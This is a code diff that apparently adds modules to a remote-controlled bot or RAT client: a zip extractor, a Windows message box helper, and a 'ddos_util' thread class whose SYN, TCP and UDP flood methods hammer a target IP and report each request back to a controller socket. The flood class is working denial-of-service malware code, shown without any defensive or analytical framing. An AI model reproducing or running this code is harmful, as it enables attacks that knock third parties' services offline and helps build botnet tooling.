@@ -1,0 +1,127 @@
+def zip_util(zipped_file, password=None):
+
+	if os.path.isfile(zipped_file):
+
+		try:
+
+			if is_zipfile(zipped_file):
+
+				with ZipFile(zipped_file, "r") as compressed:
+
+					try:
+
+						compressed.extractall(pwd=bytes(password)) if password is not None else compressed.extractall()
+						compressed.close()
+
+						return "[32m[+][0m File '{}' extracted.\n".format(zipped_file)
+
+					except RuntimeError:
+						return "\r[91mERROR: [0mBad password for file: '%s'.\n" % zipped_file
+
+			else:
+				return "\r[91mERROR: [0mSeems to not valid zip file: '%s'.\n" % zipped_file
+
+		except BadZipfile:
+			return "\r[91mERROR: [0mFailed to unzip '%s'.\n" % zipped_file
+
+		except LargeZipFile:
+			return "\r[91mERROR: [0mFile is too big '%s'.\n" % zipped_file
+
+	else:
+		return "\r[91mERROR: [0mFile not found: '%s'.\n" % zipped_file
+
+
+
+
+
+
+class ddos_util(threading.Thread):
+
+	def __init__(self, ip, packets):
+
+		self.ip       = ip
+		self.port     = 80
+		self.size     = 1000
+		self.packets  = int(packets) + 1
+		self.syn      = socket.socket()
+		self.tcp      = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.udp      = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		threading.Thread.__init__(self)
+
+
+	def synFlood(self):
+
+		ROBOT.send(pencode("SYN-Flood started..."))
+
+		for i in range(self.packets):
+
+			try:
+				sleep(.03)
+				self.syn.connect((self.ip, self.port))
+				ROBOT.send(pencode("request " + str(i) + " sent.\n"))
+
+			except:
+				ROBOT.send(pencode("#DATA_HANDLER"))
+				break
+
+		ROBOT.send(pencode("#DATA_HANDLER"))
+
+
+
+	def tcpFlood(self):
+
+		ROBOT.send(pencode("TCP-Flood started..."))
+
+		for i in range(self.packets):
+
+			try:
+				bytes = _urandom(self.size)
+
+				self.tcp.connect((self.ip, self.port))
+				self.tcp.setblocking(0)
+				sleep(.03)
+				self.tcp.sendto(bytes, (self.ip, self.port))
+
+				ROBOT.send(pencode("request " + str(i) + " sent.\n"))
+
+			except:
+				ROBOT.send(pencode("#DATA_HANDLER"))
+				break
+
+		ROBOT.send(pencode("#DATA_HANDLER"))
+
+
+
+	def udpFlood(self):
+
+		ROBOT.send(pencode("UDP-Flood started..."))
+
+		for i in range(self.packets):
+
+			try:
+
+				bytes = _urandom(self.size)
+
+				if self.port == 0:
+					self.port = randrange(1, 65535)
+
+				sleep(.03)
+				self.udp.sendto(bytes, (self.ip, self.port))
+
+				ROBOT.send(pencode("request " + str(i) + " sent.\n"))
+
+			except:
+				ROBOT.send(pencode("#DATA_HANDLER"))
+				break
+
+		ROBOT.send(pencode("#DATA_HANDLER"))
+
+
+
+
+
+
+def msgbox_thread(message, title, button, icon):
+
+	windll.user32.MessageBoxA(0, message, title, button | icon)
+	return
